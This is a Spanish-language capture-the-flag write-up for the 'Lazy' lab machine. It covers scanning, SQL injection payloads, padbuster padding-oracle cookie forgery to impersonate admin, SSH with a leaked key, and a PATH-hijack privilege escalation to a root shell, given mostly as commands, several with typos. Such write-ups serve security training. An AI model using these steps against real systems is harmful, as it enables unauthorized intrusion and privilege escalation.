# Lazy

## Ip
`ping -c 1 10.10.10.18`

PING 10.10.10.18 (10.10.10.18) 56(84) bytes of data.       │
64 bytes from 10.10.10.18: icmp_seq=1 ttl=63 time=52.9 ms  │
                                                           │
--- 10.10.10.18 ping statistics ---                        │
1 packets transmitted, 1 received, 0% packet loss, time 0ms│
rtt min/avg/max/mdev = 52.946/52.946/52.946/0.000 ms

## whichSystem.py
`whichSystem.py 10.10.10.18`

10.10.10.18 --> Linux 

## Scanning
`nmap -p- --open -T5 -v -n 10.10.10.18 -oN allPorts`

`whatweb http://10.10.10.18`

`locate .nse`

`locate http-enum | xargs grep "categorie"` 

`nmap --script "discovery and intrusive and vuln"`

`nmap --script http-enum -p80 10.10.10.18 -oN webScan` 

`nmap -sC -sV -p22,80 10.10.10.18 -oN targetedPorts`

## Navegamos por la web
CTRL+U

wappalyzer

login y register

Probamos passwords por defecto:
- admin - admin
- admin - pasword
- admin - pass1234

Registramos nuevos users: 
- admin --> user exist?
- yintao 

Creamos /content/extensions.txt --> txt, php

`wfuzz -c -t 300 --hc=404 /usr/share/wordslits/dirbuster/directory2.3-medium.txt -w /content/extensions.txt http://10.10.10.18/FUZZ.FUZ2Z`

## SQLi en login y register
- 'or 1=1-- -
- 'or sleep(5)-- -

## burp site
Nos registramos como bdmin para conseguir el auth cookie por fuerza bruta.

## Padbuster cookie desencriptada
`for i in $(seq 1 10); do echo -e "\n[*] Usando $i bloques\n"; padbuster http://10.10.10.18/login.php cookie $i --cokies auth=cookie --encoding 0; done`

Vemos que tiene 8 bloques y seleccionamos el id ** --> Plain Text: user=yin

`padbuster http://10.10.10.18/login.php cookie 8 --cokies auth=cookie --encoding 0 -plaintext user=admin`

### Modo simplificado

registramos: admin= 

## KEY SSH

user = en la url

~~~
cd content
nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa mitsos@10.10.10.18
whoami
ls
cat user.txt
./backup
strings backup | grep shadow
~~~

## pass hijacking

nano example.c

~~~
#include <stdio.h>

int main(){
    setuid(0);
    printf("\n[*] Listado del contenido /etc/passwd\n\n");
    system("/bin/cat /etc/passwd");

    printf("\n[*] Listado del contenido /etc/passwd\n\n");
    system("/bin/cat /etc/passwd");

    return 0;

}
~~~
`gcc example.c -o backup`

## Sin ruta absoluta nos permite:

`touch cat`

`chmod 777 cat`

`echo bash -p > cat` 

`echo $PATH`

`export PATH=.:$PATH`

`./backup`

`whoami`

`cd /root`

`cat root.txt`

